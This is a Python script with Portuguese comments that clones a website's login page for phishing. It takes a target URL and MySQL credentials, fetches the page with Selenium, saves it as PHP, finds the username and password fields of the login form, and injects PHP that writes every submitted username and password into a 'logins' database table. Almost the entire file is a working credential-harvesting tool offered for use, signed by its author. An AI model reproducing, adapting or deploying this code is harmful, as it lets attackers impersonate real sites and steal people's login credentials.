from termcolor import colored, cprint
import os
import urllib.request
from datetime import datetime
from selenium import webdriver
import time
dateTimeObj = datetime.now()

# Apresentação do código

texttitle = colored("""                                                                              88           
  ,d                                                             ,d              88           
  88                                                             88              88           
MM88MMM ,adPPYba, ,adPPYYba, 8b,dPPYba, 8b,dPPYba,  ,adPPYYba, MM88MMM ,adPPYba, 88,dPPYba,   
  88   a8P_____88 ""     `Y8 88P'   "Y8 88P'    "8a ""     `Y8   88   a8"     "" 88P'    "8a  
  88   8PP"""""""       ,adPPPPP88 88         88       d8 ,adPPPPP88   88   8b         88       88  
  88,  "8b,   ,aa 88,    ,88 88         88b,   ,a8" 88,    ,88   88,  "8a,   ,aa 88       88  
  "Y888 `"Ybbd8"' `"8bbdP"Y8 88         88`YbbdP"'  `"8bbdP"Y8   "Y888 `"Ybbd8"' 88       88  
                                        88                                                    
                                        88                                                    """, 'green', attrs=['bold'])

print(texttitle + "\n\n")
texttear1 = colored(""" WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWNKkkNWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWNKxlcxNMWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWXkdololkWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWKdllldxoxNWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWXdclloO0doKWWWWWWWWWWWWW
WWWWWWWWWWWWWWWXdcllldKNklxNWWWWWWWWWWWW
WWWWWWWWWWWWWWNxcllllxXWXxlOWWWWWWWWWWWW
WWWWWWWWWWWWWNklllllldKWWKoo0WWWWWWWWWWW
WWWWWWWWWWWWNkllllllloONMW0odXWWWWWWWWWW
WWWWWWWWWWWNkllllllllloONWNOlkNWWWWWWWWW
WWWWWWWWWWWkllllllllllloONWXxoOWWWWWWWWW
WWWWWWWWWWKoclllllllllllokKN0loXWWWWWWWW
WWWWWWWWWW0lllllllllllllllokxllkWWWWWWWW
WWWWWWWWWWkcllllllllllllllllllcoKWWWWWWW
WWWWWWWWWNxcllllllllllllllllllcl0WWWWWWW
WWWWWWWWWWOlllllllllllllllllllcoKWWWWWWW
WWWWWWWWWWXxclllllllllllllllllo0WWWWWWWW
WWWWWWWWWWWXkollllllllllllllld0WWWWWWWWW
WWWWWWWWWWWWWKkdlcllllllclodONWWWWWWWWWW
WWWWWWWWWNXXXXK0kdlccccloxOKKXNWWWWWWWWW
WWWWWWWWNKOkxdddddooddddxxxxkO0XWWWWWWWW
WWWWWWWWWWNNNNNNNNNWWWNNNNNNNWNWWWWWWWWW""", 'cyan')
print(texttear1)



# Colorização do horário
textcolored = colored("[{0}:{1}:{2}]".format(dateTimeObj.hour,dateTimeObj.minute,dateTimeObj.second), 'white', 'on_cyan')
textcolored2 = colored("[{0}:{1}:{2}]".format(dateTimeObj.hour,dateTimeObj.minute,dateTimeObj.second), 'green')

# Input do site a ser copiado
teste = input(colored("[{0}:{1}:{2}] Digite o nome do site que quer clonar + /login ou afim:...   \n", 'green').format(dateTimeObj.hour, dateTimeObj.minute, dateTimeObj.second))

# Input das configurações do banco de dados

# Info de HOST
dbhost = input("[{0}] Digite a host do banco de dados CORRETAMENTE (Ex: localhost)... \n".format(textcolored2))
print("[" + textcolored + "]" + " -> Host: " + dbhost)
# Info de USER
dbuser = input("[{0}] Digite o nome de usuário do banco de dados CORRETAMENTE (Ex: root)... \n".format(textcolored2))
print("[" + textcolored + "]" + " -> User: " + dbuser)
# Info de SENHA
dbpassword = input("[{0}] Digite a senha do banco de dados CORRETAMENTE (se não tiver, deixe em branco)... \n".format(textcolored2))
if not dbpassword:
  dbpassword = ""
print("[" + textcolored + "]" + " -> Senha " + dbpassword)
# Info do DB
dbdb = input("[{0}] Digite o banco de dados CORRETAMENTE (Ex: teste)... \n".format(textcolored2))
print("[" + textcolored + "]" + " -> DB: " + dbuser)
# Abrir arquivo configs.php e escrever modificações/deletar o que já há
nl = '\n'

g = open("configs.php", "a")
g.truncate(0)
texto = (
  f'<?php {nl}'
  f'define("HOST", "{dbhost}"); {nl}'
  f'define("USUARIO", "{dbuser}"); {nl}'
  f'define("SENHA", "{dbpassword}"); {nl}'
  f'define("DB", "{dbdb}"); {nl}'
  f'$conexao = mysqli_connect(HOST, USUARIO, SENHA, DB) or die("Não foi possível conectar");'
  f'{nl} ?>'
)
g.write(texto)
g.close()

# Limpar tela
os.system('cls' if os.name == 'nt' else 'clear')

# Mostrar o site escolhido e ver se a variável está OK
print("[{0}:{1}:{2}] Site escolhido: {3}".format(dateTimeObj.hour, dateTimeObj.minute, dateTimeObj.second,teste))

# Iniciar selenium
driver = webdriver.Chrome()
driver.get(teste)
time.sleep(5)
htmlSource = driver.page_source

# Printar arquivo gerado

print ("[{0}:{1}:{2}] ARQUIVO GERADO: \n\n\n{3}".format(dateTimeObj.hour, dateTimeObj.minute, dateTimeObj.second, htmlSource))

# Fechar as abas
driver.quit()


# Mostrar onde o arquivo foi salvo
print(textcolored + " --> Arquivo salvo em site_dump.php")

# Abrir e escrever o HTML do site
f = open("site_dump.php", "a")
# Apagar dados já existentes no arquivo
f.truncate(0)
textt = f'<?php {nl} include("configs.php"); {nl} ?> {nl}'
f.write(textt)
f.write("{0}".format(str(htmlSource))) 


xarquivo = str(htmlSource)

x9 = htmlSource.find("<form")
x19 = htmlSource.find("</form>")
# Fechar o arquivo e salvar as modificações
f.close()


# Printar form encontrado, se tiver

print("{0} Form encontrado! \n {1}".format(textcolored, htmlSource[x9:x19]))

formSource = htmlSource[x9:x19]
# Abrir/criar arquivo form_dump.php
g = open("form_dump.php", "a")

# Apagar dados já existentes
g.truncate(0)

# Escrever o formulário no arquivo
g.write("{0}".format(formSource))
g.write("</form>")

# Achar no form o input name='username'
inputAuser = formSource.find('name="username"')
valueuser = "username"
# Se não houver input de username ele busca por usuario
if(inputAuser == -1):
  inputAuser = formSource.find('name="usuario"')
  valueuser = "usuario"



# Achar o input da senha
inputAsenha = formSource.find('name="senha"')
valuesenha = "senha"
# Se não houver input da senha = senha, ele busca por password
if(inputAsenha == -1):
  inputAsenha = formSource.find('name="password"')
  valuesenha = "password"

# Achar botão de enviar
inputAsubmit = formSource.find('type="submit"')
valuesubmit = "submit"
if(inputAsubmit == -1):
  inputAsubmit = formSource.find('type="enviar"')
  valuesubmit = "enviar"



# Abrir novamente arquivo site_dump e escrever o php
f = open("site_dump.php", "a")

text = (
    f' {nl} {nl} {nl} <!-- Começo PHP AUTO -->{nl}'
    f'<?php {nl}'
f'if(isset($_POST["{valuesubmit}"])) {{ {nl} '
f'$user = $_POST["{valueuser}"]; {nl}'
f'$senha = $_POST["{valuesenha}"]; {nl}'
f'$sql = "INSERT INTO logins (user,senha)  VALUES ($user, $senha)";'
f'{nl}'
f'$result = mysqli_query($conexao, $sql); {nl}'
f'}}'
f'{nl}?>'
f'{nl} <!-- Fim PHP AUTO BY: theGuiihBR#0001 ~ the1scient@protonmail.com --> '
)
f.write(text)
f.close()

print(textcolored + " ---> PHP AUTO gerado com sucesso! \n {0}".format(text))

print("\n\n\n {0} ----> Todos os arquivos foram gerados com sucesso. Obrigado por utilizar a ferramenta. theGuiihBR#0001 ou the1scient@protonmail.com (github: theGuiihBR ou the1scient)".format(textcolored2))